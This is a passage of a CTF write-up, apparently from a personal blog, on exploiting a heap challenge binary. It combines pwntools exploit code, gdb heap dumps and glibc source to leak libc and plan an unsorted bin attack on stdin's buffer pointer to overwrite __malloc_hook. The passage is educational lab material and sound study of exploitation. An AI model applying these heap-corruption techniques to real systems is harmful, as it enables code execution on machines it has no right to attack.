<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">56</span>  <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xb1</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># fake unsorted chunk</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x555555608560:	0x0000000000000000	0x0000000000000041 [0]
</span><span class="s2">0x555555608570:	0x00005555556085a0	0x4141414141414141
</span><span class="s2">0x555555608580:	0x4141414141414141	0x4141414141414141
</span><span class="s2">0x555555608590:	0x4141414141414141	0x4141414141414141
</span><span class="s2">0x5555556085a0:	0x0a41414141414141	0x0000000000000041 [1]
</span><span class="s2">0x5555556085b0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085c0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085d0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085e0:	0x0000000000000000	0x00000000000000b1 [2] &lt;- Fake size | PREV_INUSE (1)
</span><span class="s2">0x5555556085f0:	0x0000000000000000	0x4343434343434343	 
</span><span class="s2">0x555555608600:	0x4343434343434343	0x4343434343434343	 
</span><span class="s2">0x555555608610:	0x0a43434343434343	0x0000000000000041 [3]	 
</span><span class="s2">0x555555608620:	0x4444444444444444	0x4444444444444444	 
</span><span class="s2">0x555555608630:	0x000000000000000a	0x0000000000000000
</span><span class="s2">0x555555608640:	0x0000000000000000	0x0000000000000000	 
</span><span class="s2">0x555555608650:	0x0000000000000000	0x0000000000000031 [4]	 
</span><span class="s2">0x555555608660:	0x4545454545454545	0x4545454545454545	 
</span><span class="s2">0x555555608670:	0x4545454545454545	0x4545454545454545	 
</span><span class="s2">0x555555608680:	0x0a45454545454545	0x0000000000000031 [10]	 
</span><span class="s2">0x555555608690:	0x0000000000000000	0x0000000000000021 &lt;- Fake chunk header 
</span><span class="s2">0x5555556086a0:	0x000000000000000a	0x0000000000000000
</span><span class="s2">0x5555556086b0:	0x0000000000000000	0x0000000000020951 &lt;- Top chunk
</span><span class="s2">
</span><span class="s2">
</span><span class="s2">fastbins
</span><span class="s2">0x30: 0x5555556085e0 ◂— 0x0
</span><span class="s2">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
</span><span class="s2">&#34;&#34;&#34;</span>

</code></pre></div><p>We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on <code>chunk_2</code> (<code>&amp;chunk_2</code> + <code>0xb0</code> = <code>0x555555608690</code>, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of <code>chunk_2</code>. If you&rsquo;re not familiar with the security checks done by <code>malloc</code> and <code>free</code>, I would advise you to take a look at <a
  class="gblog-markdown__link"
  href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks"
  
  >this resource</a
>.</p>
<p>Now that <code>chunk_2</code> has been tampered with a fake <code>0xb0</code> size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="c1"># falls into the unsortedbin</span>

<span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3ebca0</span> <span class="c1"># offset of the unsorted bin</span>

<span class="n">stdin</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3eba00</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x555555608560:	0x0000000000000000	0x0000000000000041
</span><span class="s2">0x555555608570:	0x00005555556085a0	0x4141414141414141
</span><span class="s2">0x555555608580:	0x4141414141414141	0x4141414141414141
</span><span class="s2">0x555555608590:	0x4141414141414141	0x4141414141414141
</span><span class="s2">0x5555556085a0:	0x0a41414141414141	0x0000000000000041
</span><span class="s2">0x5555556085b0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085c0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085d0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x5555556085e0:	0x0000000000000000	0x00000000000000b1
</span><span class="s2">0x5555556085f0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
</span><span class="s2">0x555555608600:	0x4343434343434343	0x4343434343434343
</span><span class="s2">0x555555608610:	0x0a43434343434343	0x0000000000000041
</span><span class="s2">0x555555608620:	0x4444444444444444	0x4444444444444444
</span><span class="s2">0x555555608630:	0x000000000000000a	0x0000000000000000
</span><span class="s2">0x555555608640:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x555555608650:	0x0000000000000000	0x0000000000000031
</span><span class="s2">0x555555608660:	0x4545454545454545	0x4545454545454545
</span><span class="s2">0x555555608670:	0x4545454545454545	0x4545454545454545
</span><span class="s2">0x555555608680:	0x0a45454545454545	0x0000000000000031
</span><span class="s2">0x555555608690:	0x00000000000000b0	0x0000000000000020
</span><span class="s2">0x5555556086a0:	0x000000000000000a	0x0000000000000000
</span><span class="s2">0x5555556086b0:	0x0000000000000000	0x0000000000020951
</span><span class="s2">
</span><span class="s2">unsortedbin
</span><span class="s2">all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span class="s2">tcachebins
</span><span class="s2">0xb0 [  7]: 0x5555556085f0 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556086b0 ◂— 0x0
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b<span class="s1">&#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/out&#39;</span>
<span class="o">[</span>!<span class="o">]</span> Debugging process with ASLR disabled
<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;/usr/bin/gdbserver&#39;</span>: pid <span class="m">31378</span>
<span class="o">[</span>*<span class="o">]</span> running in new terminal: <span class="o">[</span><span class="s1">&#39;/usr/bin/gdb&#39;</span>, <span class="s1">&#39;-q&#39;</span>, <span class="s1">&#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&#39;</span>, <span class="s1">&#39;-x&#39;</span>, <span class="s1">&#39;/tmp/pwn1z_5e0ie.gdb&#39;</span><span class="o">]</span>
<span class="o">[</span>*<span class="o">]</span> libc: 0x7ffff79e4000
</code></pre></div><p>We now have achieved the first step of the challenge: leak the libc base address.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="what-can-we-target-in-the-libc-">
        What can we target in the libc ?
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#what-can-we-target-in-the-libc-" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What can we target in the libc ?" href="#what-can-we-target-in-the-libc-">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>There are a lot of ways to achieve code execution according to what I red in other write-ups, I choose to attack <code>_IO_stdin</code> by running an unsorted bin attack on its <code>_IO_buf_end</code> field which holds the end of the internal buffer of <code>stdin</code> from <code>_IO_buf_base</code>, according to the <a
  class="gblog-markdown__link"
  href="https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/fileops.c#L469"
  
  >glibc source code</a
>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
<span class="nf">_IO_new_file_underflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">_IO_ssize_t</span> <span class="n">count</span><span class="p">;</span>
<span class="cp">#if 0</span><span class="c">
</span><span class="c">  /* SysV does not make this test; take it out for compatibility */
</span><span class="c">  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
</span><span class="c">    return (EOF);
</span><span class="c"></span><span class="cp">#endif
</span><span class="cp"></span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* Flush all line buffered files before reading. */</span>
  <span class="cm">/* FIXME This can/should be moved to genops ?? */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span><span class="o">|</span><span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
    <span class="p">{</span>
<span class="cp">#if 0</span><span class="c">
</span><span class="c">      _IO_flush_all_linebuffered ();
</span><span class="c"></span><span class="cp">#else
</span><span class="cp"></span>      <span class="cm">/* We used to flush all line-buffered stream.  This really isn&#39;t
</span><span class="cm">	 required by any standard.  My recollection is that
</span><span class="cm">	 traditional Unix systems did this for stdout.  stderr better
</span><span class="cm">	 not be line buffered.  So we do just that here
</span><span class="cm">	 explicitly.  --drepper */</span>
      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">((</span><span class="n">_IO_stdout</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_NO_WRITES</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	  <span class="o">==</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	<span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>

      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">);</span>
<span class="cp">#endif
</span><span class="cp"></span>    <span class="p">}</span>

  <span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

  <span class="cm">/* This is very tricky. We have to adjust those
</span><span class="cm">     pointers before we call _IO_SYSREAD () since
</span><span class="cm">     we may longjump () out while waiting for
</span><span class="cm">     input. Those pointers may be screwed up. H.J. */</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span>
    <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
		       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
      <span class="k">else</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* If a stream is read to EOF, the calling application may switch active
</span><span class="cm">	 handles.  As a result, our offset cache would no longer be valid, so
</span><span class="cm">	 unset it.  */</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
  <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The interesting part is the <code>count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code> which reads <code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code> bytes in <code>fp-&gt;_IO_buf_base</code>. Which means if <code>fp-&gt;_IO_buf_end</code> is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that <code>&amp;unsorted bin &gt; fp-&gt;_IO_buf_base</code>, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in gdb to see what&rsquo;s actually going on:</p>
<pre tabindex="0"><code>pwndbg&gt; x/100gx stdin
0x7ffff7dcfa00 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007ffff7dcfa83
0x7ffff7dcfa10 &lt;_IO_2_1_stdin_+16&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa20 &lt;_IO_2_1_stdin_+32&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa30 &lt;_IO_2_1_stdin_+48&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa40 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffff7dcfa84	0x0000000000000000
0x7ffff7dcfa50 &lt;_IO_2_1_stdin_+80&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfa60 &lt;_IO_2_1_stdin_+96&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfa70 &lt;_IO_2_1_stdin_+112&gt;:	0x0000001000000000	0xffffffffffffffff
0x7ffff7dcfa80 &lt;_IO_2_1_stdin_+128&gt;:	0x000000000a000000	0x00007ffff7dd18d0
0x7ffff7dcfa90 &lt;_IO_2_1_stdin_+144&gt;:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dcfaa0 &lt;_IO_2_1_stdin_+160&gt;:	0x00007ffff7dcfae0	0x0000000000000000
0x7ffff7dcfab0 &lt;_IO_2_1_stdin_+176&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfac0 &lt;_IO_2_1_stdin_+192&gt;:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dcfad0 &lt;_IO_2_1_stdin_+208&gt;:	0x0000000000000000	0x00007ffff7dcc2a0
0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfaf0 &lt;_IO_wide_data_0+16&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb00 &lt;_IO_wide_data_0+32&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb10 &lt;_IO_wide_data_0+48&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb20 &lt;_IO_wide_data_0+64&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb30 &lt;_IO_wide_data_0+80&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb40 &lt;_IO_wide_data_0+96&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb50 &lt;_IO_wide_data_0+112&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb60 &lt;_IO_wide_data_0+128&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb70 &lt;_IO_wide_data_0+144&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb80 &lt;_IO_wide_data_0+160&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb90 &lt;_IO_wide_data_0+176&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfba0 &lt;_IO_wide_data_0+192&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbb0 &lt;_IO_wide_data_0+208&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbc0 &lt;_IO_wide_data_0+224&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbd0 &lt;_IO_wide_data_0+240&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbe0 &lt;_IO_wide_data_0+256&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbf0 &lt;_IO_wide_data_0+272&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc00 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc10 &lt;_IO_wide_data_0+304&gt;:	0x00007ffff7dcbd60	0x0000000000000000
0x7ffff7dcfc20 &lt;__memalign_hook&gt;:	0x00007ffff7a7b410	0x00007ffff7a7c790
0x7ffff7dcfc30 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000001
0x7ffff7dcfc50 &lt;main_arena+16&gt;:	0x0000000000000000	0x00005555556085e0
0x7ffff7dcfc60 &lt;main_arena+32&gt;:	0x0000555555608560	0x0000000000000000
0x7ffff7dcfc70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc80 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc90 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfca0 &lt;main_arena+96&gt;:	0x00005555556086b0	&lt;- &amp;unsortedbin = 0x7ffff7dcfca0
pwndbg&gt; p *stdin
$1 = {
  _flags = -72540021,
  _IO_read_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_read_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
  _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0,
  _flags2 = 16,
  _old_offset = -1,
  _cur_column = 0,
  _vtable_offset = 0 '\000',
  _shortbuf = &quot;\n&quot;,
  _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;,
  _offset = -1,
  _codecvt = 0x0,
  _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0,
  _mode = -1,
  _unused2 = '\000' &lt;repeats 19 times&gt;
}
</code></pre><p>As you can see right above and according to the source code showed previously, <code>_IO_stdin-&gt;_IO_buf_base</code> points toward <code>_IO_stdin-&gt;_shortbuf</code>, an internal buffer directly in <code>stdin</code>. And <code>&amp;unsortedbin &gt; _IO_buf_base &gt; stdin</code>. If you do not understand fully my explanations, I advise you to take a look at <a
  class="gblog-markdown__link"
  href="https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/"
  
  >this great article</a
>.</p>
<p>Then we should be able to control every bytes between <code>&amp;stdin-&gt;_shortbuf</code> and <code>&amp;unsortedbin</code>. And the incredible thing to note is that in this small range, there is what every heap pwner is always looking for: <code>__malloc_hook</code> !!</p>
<p>Then we just have to overwrite the pointers inside <code>stdin</code>, <code>_IO_wide_data_0</code> and <code>__memalign_hook</code> to finally reach <code>__malloc_hook</code> and write the address of a one-gadget !</p>
<div class="gblog-post__anchorwrap">
    <h2 id="unsorted-bin-attack-on-stdin-_io_buf_end">
        Unsorted bin attack on stdin-&gt;_IO_buf_end
        <a data-clipboard-text="https://nasm.re/posts/onceforall/#unsorted-bin-attack-on-stdin-_io_buf_end" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Unsorted bin attack on stdin-&gt;_IO_buf_end" href="#unsorted-bin-attack-on-stdin-_io_buf_end">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Here was theory, let&rsquo;s see how we can do that. To understand unsorted bin attack <a
  class="gblog-markdown__link"
  href="https://squarepants0.github.io/2020/10/20/unsorted-bin-attack/"
  
  >here</a
> is a good article about unsorted bin attack. The unsorted bin attack using partial unlink is basically:</p>
<ul>
<li>overwrite the backward pointer of the last chunk in the unsorted bin by <code>&amp;target - 0x10</code></li>
<li>request the <strong>exact</strong> size of the last chunk in the unsorted bin</li>
<li>It should write at <code>&amp;target</code> the address of the unsorted bin</li>
</ul>
<p>An essential thing to note is that if there is no chunks in your fastbin / smallbin and that you&rsquo;re requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn&rsquo;t fit the request, the program will most of the time issues a <code>malloc(): memory corruption</code>. Anyway the best thing to do is to take a look at the <a
  class="gblog-markdown__link"
  href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3519"
  
  >code</a
>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
<span class="nf">_int_malloc</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">bytes</span><span class="p">)</span>
<span class="p">{</span>

<span class="c1">// It checks first fastbin then smallbin then unsorted bin
</span><span class="c1"></span>
<span class="k">for</span> <span class="p">(;;</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="kt">int</span> <span class="n">iters</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
